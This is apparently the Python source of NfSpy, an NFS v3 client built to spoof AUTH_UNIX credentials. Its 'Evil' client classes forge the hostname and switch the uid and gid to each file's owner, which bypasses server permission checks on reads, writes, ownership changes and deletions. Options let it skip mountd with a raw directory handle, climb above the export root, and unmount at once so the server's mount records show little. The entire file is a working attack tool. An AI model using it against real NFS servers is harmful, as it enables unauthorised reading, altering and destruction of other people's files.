#!/usr/bin/env python

# NFS v3 implementation with auth-spoofing
# by Daniel Miller

import rpc
from errno import *
import socket
from time import time
from nfsclient import *
from mountclient import PartialMountClient, MOUNTPROG
import os
import stat
from threading import Lock
from lrucache import LRU

class FallbackUDPClient(rpc.RawUDPClient):
    def __init__(self, host, prog, vers, port=None):
        if port is None:
            pmap = rpc.UDPPortMapperClient(host)
            port = pmap.Getport((prog, vers, rpc.IPPROTO_UDP, 0))
            pmap.close()
            if port == 0:
                raise RuntimeError, 'program not registered'
        rpc.RawUDPClient.__init__(self, host, prog, vers, port)

class FallbackTCPClient(rpc.RawTCPClient):
    def __init__(self, host, prog, vers, port=None):
        if port is None:
            pmap = rpc.TCPPortMapperClient(host)
            port = pmap.Getport((prog, vers, rpc.IPPROTO_TCP, 0))
            pmap.close()
            if port == 0:
                raise RuntimeError, 'program not registered'
        rpc.RawTCPClient.__init__(self, host, prog, vers, port)

class FallbackTCPMountClient(PartialMountClient, FallbackTCPClient):
    def __init__(self, host, port=None):
        self.version = 3
        self.cred = (rpc.AUTH_NULL, rpc.make_auth_null())
        FallbackTCPClient.__init__(self, host, MOUNTPROG, 3, port)


class FallbackUDPMountClient(PartialMountClient, FallbackUDPClient):
    def __init__(self, host, port=None):
        self.version = 3
        self.cred = (rpc.AUTH_NULL, rpc.make_auth_null())
        FallbackUDPClient.__init__(self, host, MOUNTPROG, 3, port)
        self.BUFSIZE = NFSSVC_MAXBLKSIZE + NFS3_READ_XDR_SIZE

class NFSAbstractStat(object):
    arr = ()
    def __init__(self):
        for n in self.__class__.arr:
            setattr(self, n, 0)
    def __getitem__(self,i):
        return getattr(self, self.__class__.arr[i])
    def __setitem__(self,i,v):
        return setattr(self, self.__class__.arr[i], v)

class NFSStatvfs(NFSAbstractStat):
    arr = (
        "f_bsize",
        "f_frsize",
        "f_blocks",
        "f_bfree",
        "f_bavail",
        "f_files",
        "f_ffree",
        "f_favail",
        "f_flag",
        "f_namemax",
        )

class NFSStat(NFSAbstractStat):
    arr = (
        "st_mode",
        "st_ino",
        "st_dev",
        "st_nlink",
        "st_uid",
        "st_gid",
        "st_size",
        "st_atime",
        "st_mtime",
        "st_ctime",
        )

class EvilNFSClient(PartialNFSClient):
    def mkcred(self):
        self.cred = rpc.AUTH_UNIX, rpc.make_auth_unix(int(time()),
            self.fakename or socket.gethostname(), self.fuid, self.fgid, [])
        return self.cred

class EvilFallbackTCPNFSClient(EvilNFSClient, FallbackTCPClient):
    def __init__(self, host, port=None, fakename=None):
        self.fakename = fakename
        FallbackTCPClient.__init__(self, host, NFS_PROGRAM, NFS_VERSION, port)

class EvilFallbackUDPNFSClient(EvilNFSClient, FallbackUDPClient):
    def __init__(self, host, port=None, fakename=None):
        self.fakename = fakename
        FallbackUDPClient.__init__(self, host, NFS_PROGRAM, NFS_VERSION, port)
        self.BUFSIZE = NFSSVC_MAXBLKSIZE + NFS3_READ_XDR_SIZE

class NFSNode(object):
    def __init__(self):
        pass

def splitport(port):
    port = port.split('/',1)
    proto = None
    if len(port) == 2:
        port, proto = port
    else:
        port = port[0]
    try:
        port = int(port)
    except ValueError:
        proto = port
        port = None
    return port, proto

class NfSpy(object):
    options = (
            {'mountopt': 'server',
                'metavar': 'HOST:PATH',
                'help': 'connect to server HOST:PATH'},

            {'mountopt': 'hide',
                'action': 'store_true',
                'help': 'Immediately unmount from the server, staying mounted on the client'},

            {'mountopt': 'cachesize',
                'type': 'int',
                'metavar': 'N',
                'default': 1024,
                'help': 'Number of handles to cache'},

            {'mountopt': 'cachetimeout',
                'type': 'int',
                'metavar': 'T',
                'default': 120,
                'help': 'Timeout on handle cache'},

            {'mountopt': 'mountport',
                'metavar': 'PORT/TRANSPORT',
                'default': 'udp',
                'help': 'Specify port/transport for mount protocol, e.g. "635/udp"'},

            {'mountopt': 'nfsport',
                'metavar': 'PORT/TRANSPORT',
                'default': 'udp',
                'help': 'Specify port/transport for NFS protocol, e.g. "2049/udp"'},

            {'mountopt': 'dirhandle',
                'metavar': '00:AA:BB...',
                'help': 'Use a hex bytes representation of a directory handle instead of using mountd. Colons are ignored.'},

            {'mountopt': 'getroot',
                'action': 'store_true',
                'help': 'Try to find the top-level directory of the export from the directory handle provided with "dirhandle"'},

            {'mountopt': 'fakename',
                'metavar': 'HOSTNAME',
                'help': 'try to fake your hostname'},

            )

    def __init__(self, server=None, mountport="udp", nfsport="udp",
            dirhandle=None, hide=False, getroot=False, fakename=None,
            cachesize=1024, cachetimeout=120):
        self.authlock = Lock()
        self.cachetimeout = int(cachetimeout)
        self.cache = int(cachesize)
        self.mountport = mountport
        self.nfsport = nfsport
        self.mcl = None
        self.handles = None
        self.dirhandle = dirhandle
        self.hide = hide
        self.getroot = getroot
        self.server = server
        self.fakename=fakename

    def fsinit(self):
        class FakeUmnt:
            """
            To avoid multiple calls to mountclient.Umnt, set self.mcl = FakeUmnt()
            """
            def Umnt(self, path):
                pass

        if self.server:
            self.host, self.path = self.server.split(':',1);
        else:
            raise RuntimeError, "No server specified"

        if self.dirhandle:
            self.mcl = FakeUmnt()
            dh = self.dirhandle.translate(None, ':')
            self.rootdh = ''.join( chr(int(dh[i:i+2],16)) for i in range(0,len(dh),2) )
        else:
            port, proto = splitport(self.mountport)
            proto = proto or "udp"
            try:
                if proto == "udp":
                    self.mcl = FallbackUDPMountClient(self.host, port)
                elif proto == "tcp":
                    self.mcl = FallbackTCPMountClient(self.host, port)
                else:
                    raise RuntimeError, "Invalid mount transport: %s" % proto
            except socket.error as e:
                raise RuntimeError, "Problem mounting to %s:%s/%s: %s\n" % (
                        self.host, repr(port), proto, os.strerror(e.errno))

            status, dirhandle, auth_flavors = self.mcl.Mnt(self.path)
            if status != 0:
                raise IOError(status, os.strerror(status), self.path)
            if self.hide:
                self.mcl.Umnt(self.path)
                self.mcl = FakeUmnt()
            self.rootdh = dirhandle

        port, proto = splitport(self.nfsport)
        proto = proto or "udp"
        try:
            if proto == "udp":
                self.ncl = EvilFallbackUDPNFSClient(self.host, port,fakename=self.fakename)
            elif proto == "tcp":
                self.ncl = EvilFallbackTCPNFSClient(self.host, port,fakename=self.fakename)
            else:
                raise RuntimeError, "Invalid NFS transport: %s" % proto
        except socket.error as e:
            raise RuntimeError, "Problem establishing NFS to %s:%s/%s: %s\n" % (
                    self.host, repr(port), proto, os.strerror(e.errno))

        self.ncl.fuid = self.ncl.fgid = 0

        rest = self.ncl.Fsinfo(self.rootdh)
        if rest[0]:
            self.rootattr = rest[0]
        else:
            self.rootattr = self.ncl.Getattr(self.rootdh)
        self.ncl.fuid = self.rootattr[3]
        self.ncl.fgid = self.rootattr[4]
        self.rtsize = min(rest[2] or 4096, NFSSVC_MAXBLKSIZE)
        self.wtsize = min(rest[5] or 4096, NFSSVC_MAXBLKSIZE)
        self.handles = LRU(self.cache)

        if self.getroot:
            try:
                handle, attr = self.gethandle("/..")
                while handle != self.rootdh:
                    self.rootdh = handle
                    self.rootattr = attr
                    handle, attr = self.gethandle("/..")
            except NFSError as e:
                if e.value != NFSError.NFS3ERR_NOENT:
                    raise

    def _gethandle(self, path):
        fh = None
        fattr = None
        try:
            if path == "" or path == "/" or path == "/.." or path == "/.":
                fh = self.rootdh
                fattr = self.rootattr
            else:
                fh, fattr, cachetime = self.handles[path]
            # check that it isn't stale
            self.ncl.fuid = fattr[3]
            self.ncl.fgid = fattr[4]
            #Commented to save a call. May cause problems?
            #fattr = self.ncl.Getattr(dh)
            #self.handles[path][1] = fattr
        except (KeyError,NFSError) as e:
            if isinstance(e, KeyError) or e.errno() == NFSError.NFS3ERR_STALE:
                if isinstance(e, NFSError):
                    del self.handles[path]
                tmppath, elem = path.rsplit("/",1)
                dh, fattr = self.gethandle(tmppath)
                self.ncl.fuid = fattr[3]
                self.ncl.fgid = fattr[4]
                fh, fattr, dattr = self.ncl.Lookup((dh, elem))
                self.ncl.fuid = fattr[3]
                self.ncl.fgid = fattr[4]
                self.handles[path] = (fh, fattr, time())
                self.handles[tmppath] = (dh, dattr, time())
            else:
                raise
        return (fh, fattr)

    def gethandle(self, path):
        if len(self.handles.d) >= self.handles.count:
            # only prune if cache is full, since prune is O(N)
            now = time()
            self.handles.prune(lambda x: now - x[2] > self.cachetimeout)
        return self._gethandle(path)

    #'getattr'
    def getattr(self, path):
        self.authlock.acquire()
        try:
            handle, fattr = self.gethandle(path)
            fattr = self.ncl.Getattr(handle)
            self.handles[path] = (handle, fattr, time())
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no), path)
        finally:
            self.authlock.release()
        st = NFSStat()
        st.st_mode, st.st_nlink, st.st_uid, st.st_gid, st.st_size \
            = fattr[1:6]
        st.st_atime = fattr[10][0]
        st.st_mtime = fattr[11][0]
        st.st_ctime = fattr[12][0]
        return st

    #'readlink'
    def readlink(self, path):
        if path == "/":
            return ''
        self.authlock.acquire()
        try:
            handle, fattr = self.gethandle(path)
            if fattr[0] != NF3LNK:
                raise IOError(EINVAL, os.strerror(EINVAL), path)
            fattr, name = self.ncl.Readlink(handle)
            self.handles[path] = (handle, fattr, time())
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no), path)
        finally:
            self.authlock.release()
        return name

    #'readdir'
    def readdir(self, path, offset):
        self.authlock.acquire()
        try:
            handle, fattr = self.gethandle(path)
            entries = self.ncl.Listdir(handle, self.rtsize)
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no), path)
        finally:
            self.authlock.release()
        return entries

    #'mknod'
    def mknod(self, path, mode, rdev):
        dirpath, name = path.rsplit('/',1)
        handle = None
        fattr = None
        self.authlock.acquire()
        try:
            handle, fattr = self.gethandle(dirpath)
            if stat.S_ISREG(mode):
                nh, nattr, wcc = self.ncl.Create(
                        (handle, name, 1, #GUARDED
                            (mode, fattr[3], fattr[4], None, (1,), (1,))
                            )
                        )
            else:
                data = None
                if stat.S_ISCHR(mode):
                    stype = NF3CHR
                    data = (os.major(rdev), os.minor(rdev))
                elif stat.S_ISBLK(mode):
                    stype = NF3BLK
                    data = (os.major(rdev), os.minor(rdev))
                elif stat.S_ISSOCK(mode):
                    stype = NF3SOCK
                elif stat.S_ISFIFO(mode):
                    stype = NF3FIFO
                else:
                    raise IOError(ENOSYS, os.strerror(ENOSYS))
                nh, nattr, wcc = self.ncl.Mknod(
                        (handle, name, stype, (mode, fattr[3], fattr[4], None, 
                            (1,), (1,) ), data)
                        )
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no), path)
        finally:
            self.authlock.release()
        now = time()
        self.handles[path] = (nh, nattr, now)
        if wcc[1]:
            self.handles[dirpath] = (handle, wcc[1], now)

    #'mkdir'
    def mkdir(self, path, mode):
        dirpath, name = path.rsplit('/',1)
        handle = None
        fattr = None
        self.authlock.acquire()
        try:
            handle, fattr = self.gethandle(dirpath)
            nh, nattr, wcc = self.ncl.Mkdir(
                    (handle, name, (mode, fattr[3], fattr[4], None, (1,), (1,)))
                    )
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no), path)
        finally:
            self.authlock.release()
        now = time()
        self.handles[path] = (nh, nattr, now)
        if wcc[1]:
            self.handles[dirpath] = (handle, wcc[1], now)

    #'unlink'
    def unlink(self, path):
        dirpath, name = path.rsplit('/',1)
        handle = None
        fattr = None
        self.authlock.acquire()
        try:
            handle, _ = self.gethandle(dirpath)
            _, fattr = self.gethandle(path)
            if fattr[0] == NF3DIR:
                raise IOError(EISDIR, os.strerror(EISDIR), path)
            wcc = self.ncl.Remove((handle, name))
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no), path)
        finally:
            self.authlock.release()
        if wcc[1]:
            self.handles[dirpath] = (handle, wcc[1], time())

    #'rmdir'
    def rmdir(self, path):
        dirpath, name = path.rsplit('/',1)
        handle = None
        fattr = None
        self.authlock.acquire()
        try:
            handle, _ = self.gethandle(dirpath)
            _, fattr = self.gethandle(path)
            if fattr[0] != NF3DIR:
                raise IOError(ENOTDIR, os.strerror(ENOTDIR), path)
            wcc = self.ncl.Rmdir((handle, name))
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no), path)
        finally:
            self.authlock.release()
        if wcc[1]:
            self.handles[dirpath] = (handle, wcc[1], time())

    #'symlink'
    def symlink(self, target, name):
        dirpath, name = name.rsplit('/',1)
        handle = None
        fattr = None
        self.authlock.acquire()
        try:
            handle, _ = self.gethandle(dirpath)
            nh, nattr, wcc = self.ncl.Symlink((handle, name, 
                (None, self.ncl.fuid, self.ncl.fgid, None, (1,), (1,)),
                target ))
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no))
        finally:
            self.authlock.release()
        now = time()
        self.handles[path] = (nh, nattr, now)
        if wcc[1]:
            self.handles[dirpath] = (handle, wcc[1], now)

    #'rename'
    def rename(self, old, new):
        frompath, fromname = old.rsplit('/',1)
        topath, toname = new.rsplit('/',1)
        fromhandle = None
        tohandle = None
        self.authlock.acquire()
        try:
            fromhandle, _ = self.gethandle(frompath)
            tohandle, _ = self.gethandle(topath)
            self.gethandle(old) # to get appropriate fuid/fgid
            try:
                fwcc, twcc = self.ncl.Rename(
                    (fromhandle, fromname, tohandle, toname))
            except NFSError as e:
                if e.value == NFSError.NFS3ERR_ACCES:
                    self.gethandle(topath) #try different permissions
                    fwcc, twcc = self.ncl.Rename(
                        (fromhandle, fromname, tohandle, toname))
                else:
                    raise e
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no))
        finally:
            self.authlock.release()
        now = time()
        if fwcc[1]:
            self.handles[frompath] = (fromhandle, fwcc[1], now)
        if twcc[1]:
            self.handles[topath] = (tohandle, twcc[1], now)

    #'link'
    def link(self, target, name):
        dirpath, name = name.rsplit('/',1)
        fromhandle = None
        todir = None
        self.authlock.acquire()
        try:
            fromhandle, _ = self.gethandle(target)
            todir, _ = self.gethandle(dirpath)
            attr, wcc = self.ncl.Link((fromhandle, todir, name))
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no))
        finally:
            self.authlock.release()
        now = time()
        self.handles[target] = (fromhandle, attr, now)
        self.handles[name] = (fromhandle, attr, now)
        if wcc[1]:
            self.handles[dirpath] = (todir, wcc[1], now)

    #'chmod'
    def chmod(self, path, mode):
        self.authlock.acquire()
        handle = None
        fattr = None
        try:
            handle, fattr = self.gethandle(path)
            wcc = self.ncl.Setattr((handle,
                (mode, None, None, None, (0,), (0,)), None ))
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no))
        finally:
            self.authlock.release()
        self.handles[path] = (handle, wcc[1] or fattr, time())

    #'chown'
    def chown(self, path, uid, gid):
        self.authlock.acquire()
        handle = None
        fattr = None
        try:
            handle, fattr = self.gethandle(path)
            wcc = self.ncl.Setattr((handle,
                (None, uid, gid, None, (0,), (0,)), None ))
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no))
        finally:
            self.authlock.release()
        if wcc[1]:
            self.handles[path] = (handle, wcc[1], time())

    #'truncate'
    def truncate(self, path, size):
        self.authlock.acquire()
        handle = None
        fattr = None
        try:
            handle, fattr = self.gethandle(path)
            wcc = self.ncl.Setattr((handle,
                (None, None, None, size, (1,), (1,)), None ))
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no))
        finally:
            self.authlock.release()
        if wcc[1]:
            self.handles[path] = (handle, wcc[1], time())

    #'utime'
    def utime(self, path, times):
        atime, mtime = times
        self.authlock.acquire()
        handle = None
        fattr = None
        try:
            handle, fattr = self.gethandle(path)
            wcc = self.ncl.Setattr((handle,
                (None, None, None, None, (2,(atime,0)), (2,(mtime,0))), None ))
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no))
        finally:
            self.authlock.release()
        if wcc[1]:
            self.handles[path] = (handle, wcc[1], time())

    #'open'
    #'read'
    def read(self, path, size, offset):
        if path == "/":
            raise IOError( EISDIR, os.strerror(EISDIR))
        handle = None
        fattr = None
        data = None
        self.authlock.acquire()
        try:
            handle, fattr = self.gethandle(path)
            ret = r''
            for chunk in range(offset, offset + size, self.rtsize):
                fattr, count, eof, data = self.ncl.Read(
                        (handle, chunk, min(self.rtsize,size)))
                ret += data
                if eof: break
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no), path)
        finally:
            self.authlock.release()
        self.handles[path] = (handle, fattr, time())
        return ret

    #'write'
    def write(self, path, buf, offset):
        self.authlock.acquire()
        handle = None
        fattr = None
        size = 0
        wcc = (None,fattr)
        try:
            handle, fattr = self.gethandle(path)
            for chunk in range(offset, offset+len(buf), self.wtsize):
                length = min(self.wtsize, offset + len(buf) - chunk)
                base = chunk - offset
                wcc, count, committed, verf = self.ncl.Write((handle, chunk,
                    length, 2, buf[base:base+length]))
                size += count
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no), path)
        finally:
            self.authlock.release()
        if wcc[1]:
            self.handles[path] = (handle, wcc[1], time())
        return size

    #'release'
    #'statfs'
    def statfs(self):
        st = NFSStatvfs()
        rest = self.ncl.Fsstat(self.rootdh)
        #XXX: This should be ok, but doesn't actually work?
        #self.rootattr = rest[0]
        st.f_frsize = st.f_bsize = self.rtsize
        st.f_blocks = int(rest[1] // self.rtsize)
        st.f_bfree = int(rest[2] // self.rtsize)
        st.f_bavail = int(rest[3] // self.rtsize)
        st.f_files = rest[4]
        st.f_ffree = rest[5]
        st.f_favail = rest[6]
        return st

    #'fsync'
    #'create'
    #'opendir'
    #'releasedir'
    #'fsyncdir'
    #'flush'
    #'fgetattr'
    #'ftruncate'
    #'getxattr'
    #'listxattr'
    #'setxattr'
    #'removexattr'
    #'access'
    def access(self, path, mode):
        self.authlock.acquire()
        try:
            handle, fattr = self.gethandle(path)
        except NFSError as e:
            no = e.errno()
            raise IOError(no, os.strerror(no), path)
        finally:
            self.authlock.release()
        if mode == os.F_OK:
            return 0
        rmode = fattr[1]
        uid = fattr[3]
        gid = fattr[4]
        if uid != 0 and gid != 0:
            return 0
        elif gid != 0:
            if mode & os.R_OK and rmode & 044:
                return 0
            elif mode & os.W_OK and rmode & 022:
                return 0
            elif mode & os.X_OK and rmode & 011:
                return 0
            else:
                raise IOError(EACCES, os.strerror(EACCES), path)
        elif uid != 0:
            if mode & os.R_OK and rmode & 0404:
                return 0
            elif mode & os.W_OK and rmode & 0202:
                return 0
            elif mode & os.X_OK and rmode & 0101:
                return 0
            else:
                raise IOError(EACCES, os.strerror(EACCES), path)
        else: #uid and gid == 0
            if mode & os.R_OK and rmode & 4:
                return 0
            elif mode & os.W_OK and rmode & 2:
                return 0
            elif mode & os.X_OK and rmode & 1:
                return 0
            else:
                raise IOError(EACCES, os.strerror(EACCES), path)

    #'lock'
    #'utimens'
    #'bmap'
    #'fsinit'
    #'fsdestroy'
    def fsdestroy(self):
        self.mcl.Umnt(self.path)

